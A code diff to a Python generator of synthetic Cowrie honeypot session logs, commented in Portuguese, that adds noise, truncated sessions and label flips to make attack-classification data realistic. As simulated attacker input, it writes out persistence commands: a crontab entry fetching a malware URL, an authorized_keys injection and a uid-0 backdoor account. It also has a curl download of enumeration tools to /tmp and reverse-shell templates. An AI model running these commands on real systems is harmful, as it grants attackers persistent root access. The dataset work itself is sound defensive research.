@@ -76,9 +76,22 @@ def _ev(eventid: str, session: str, ts: str, src_ip: str, **kw) -> dict:
     return {"eventid": eventid, "session": session, "timestamp": ts,
             "src_ip": src_ip, "sensor": "cowrie", **kw}
 
+
+def _truncate(events: list) -> list:
+    """Corta a sessao logo apos o handshake, mantendo o evento de fechamento.
+
+    Reproduz o scanner que conecta, negocia a versao e desiste — o padrao mais
+    comum em trafego real e o unico que NAO existia no dataset sintetico. Foi
+    exatamente esse caso que o modelo classificou errado em producao
+    (sessao sem login e sem comando rotulada como brute_force).
+    """
+    head = [e for e in events if e["eventid"] in
+            ("cowrie.session.connect", "cowrie.client.version")]
+    return head + [events[-1]]
+
 # ── geradores por classe ──────────────────────────────────────────────────────
 
-def gen_brute_force(base: datetime) -> list:
+def gen_brute_force(base: datetime, noise: float = 0.0) -> list:
     """Muitas tentativas de login rápidas, sem acesso ao shell."""
     sid = uuid.uuid4().hex[:12]
     ip = _ip()
@@ -92,9 +105,21 @@ def gen_brute_force(base: datetime) -> list:
                   version=random.choice(SSH_CLIENTS)))
 
     usernames = random.sample(USERNAMES, random.randint(3, 8))
-    for _ in range(random.randint(60, 300)):
+    # Ruido: campanhas curtas (poucas tentativas) sao comuns e se confundem
+    # com o preambulo de command_injection/malware_download.
+    n_attempts = (random.randint(4, 20) if random.random() < 0.30 * noise
+                  else random.randint(60, 300))
+    for _ in range(n_attempts):
         t += random.uniform(80, 600)
         ev.append(_ev("cowrie.login.failed", sid, _ts(base, t), ip,
+                      username=random.choice(usernames),
+                      password=random.choice(PASSWORDS)))
+
+    # Ruido: parte das campanhas efetivamente acerta a senha e encerra sem
+    # executar nada — fica indistinguivel de um recon que desistiu.
+    if random.random() < 0.25 * noise:
+        t += random.uniform(200, 800)
+        ev.append(_ev("cowrie.login.success", sid, _ts(base, t), ip,
                       username=random.choice(usernames),
                       password=random.choice(PASSWORDS)))
 
@@ -104,7 +129,7 @@ def gen_brute_force(base: datetime) -> list:
     return ev
 
 
-def gen_command_injection(base: datetime) -> list:
+def gen_command_injection(base: datetime, noise: float = 0.0) -> list:
     """Poucos erros de login, acesso, depois reverse shell ou payload malicioso."""
     sid = uuid.uuid4().hex[:12]
     ip = _ip()
@@ -132,7 +157,16 @@ def gen_command_injection(base: datetime) -> list:
         t += random.uniform(2000, 8000)
         ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=cmd))
 
-    shell = random.choice(REVERSE_SHELL_TEMPLATES).format(ip=atk_ip, port=atk_port)
+    # Ruido: nem toda injecao usa reverse shell. Persistencia via crontab ou
+    # chave SSH remove justamente a feature mais discriminativa da classe.
+    if random.random() < 0.30 * noise:
+        shell = random.choice([
+            f"echo '* * * * * root {random.choice(MALWARE_URLS)}' >> /etc/crontab",
+            "echo 'ssh-rsa AAAAB3Nza...' >> /root/.ssh/authorized_keys",
+            "useradd -ou 0 -g 0 svc && echo 'svc:svc' | chpasswd",
+        ])
+    else:
+        shell = random.choice(REVERSE_SHELL_TEMPLATES).format(ip=atk_ip, port=atk_port)
     t += random.uniform(3000, 12000)
     ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=shell))
 
@@ -142,7 +176,7 @@ def gen_command_injection(base: datetime) -> list:
     return ev
 
 
-def gen_recon(base: datetime) -> list:
+def gen_recon(base: datetime, noise: float = 0.0) -> list:
     """Login bem-sucedido seguido de enumeração passiva do sistema."""
     sid = uuid.uuid4().hex[:12]
     ip = _ip()
@@ -170,13 +204,21 @@ def gen_recon(base: datetime) -> list:
         t += random.uniform(3000, 20000)
         ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=cmd))
 
+    # Ruido: recon frequentemente baixa uma ferramenta de enumeracao
+    # (linpeas, pspy). Dispara has_wget_curl sem ser malware_download.
+    if random.random() < 0.30 * noise:
+        t += random.uniform(2000, 6000)
+        tool = random.choice(["linpeas.sh", "pspy64", "lse.sh"])
+        ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip,
+                      input=f"curl -s http://{_ip()}/{tool} -o /tmp/{tool}"))
+
     t += random.uniform(5000, 15000)
     ev.append(_ev("cowrie.session.closed", sid, _ts(base, t), ip,
                   duration=round(t / 1000, 3)))
     return ev
 
 
-def gen_malware_download(base: datetime) -> list:
+def gen_malware_download(base: datetime, noise: float = 0.0) -> list:
     """Login bem-sucedido, wget/curl para baixar e executar payload."""
     sid = uuid.uuid4().hex[:12]
     ip = _ip()
@@ -222,6 +264,14 @@ def gen_malware_download(base: datetime) -> list:
     ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip,
                   input=f"chmod +x {outfile} && {outfile}"))
 
+    # Ruido: dropper que tambem abre canal de retorno — sobrepoe com
+    # command_injection, que e o caso real de botnets tipo Mirai.
+    if random.random() < 0.25 * noise:
+        t += random.uniform(1000, 4000)
+        ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip,
+                      input=random.choice(REVERSE_SHELL_TEMPLATES).format(
+                          ip=_ip(), port=random.randint(1024, 9999))))
+
     t += random.uniform(5000, 60000)
     ev.append(_ev("cowrie.session.closed", sid, _ts(base, t), ip,
                   duration=round(t / 1000, 3)))
@@ -243,7 +293,18 @@ def generate_dataset(
     labels_path: str,
     sessions_per_class: int = 500,
     seed: int = 42,
+    noise: float = 0.0,
 ) -> None:
+    """Gera o dataset sintetico.
+
+    `noise` (0.0 a 1.0) controla quanta ambiguidade e injetada. Em 0.0 as
+    classes sao perfeitamente separaveis por tres flags binarias
+    (login_success / has_reverse_shell / has_wget_curl), o que produz
+    F1-macro = 1.0 — um resultado que mede a capacidade do modelo de
+    reconstruir o if/else do gerador, nao de reconhecer ataques. Valores
+    maiores criam sobreposicao entre classes, sessoes truncadas e erro de
+    rotulagem, aproximando o dataset do trafego real.
+    """
     random.seed(seed)
     Path(logs_path).parent.mkdir(parents=True, exist_ok=True)
 
@@ -254,8 +315,24 @@ def generate_dataset(
         print(f"  {label:<22} {sessions_per_class} sessões")
         for i in range(sessions_per_class):
             offset = timedelta(hours=i * 0.5 + random.uniform(0, 0.4))
-            events = gen_fn(base + offset)
+            events = gen_fn(base + offset, noise)
+            # Sessao abortada logo apos o handshake — vale para qualquer
+            # classe e e o padrao dominante em trafego real.
+            if random.random() < 0.15 * noise:
+                events = _truncate(events)
             all_sessions.append((events[0]["session"], label, events))
+
+    # Ruido de rotulagem: mesmo anotacao humana erra, e o dataset nao deve
+    # fingir que o ground truth e perfeito.
+    if noise:
+        labels_pool = list(ATTACK_GENERATORS)
+        n_flip = int(len(all_sessions) * 0.05 * noise)
+        for idx in random.sample(range(len(all_sessions)), n_flip):
+            sid, label, events = all_sessions[idx]
+            wrong = random.choice([c for c in labels_pool if c != label])
+            all_sessions[idx] = (sid, wrong, events)
+        if n_flip:
+            print(f"  {'(rotulos trocados)':<22} {n_flip} sessões")
 
     random.shuffle(all_sessions)  # intercala como log real faria
 
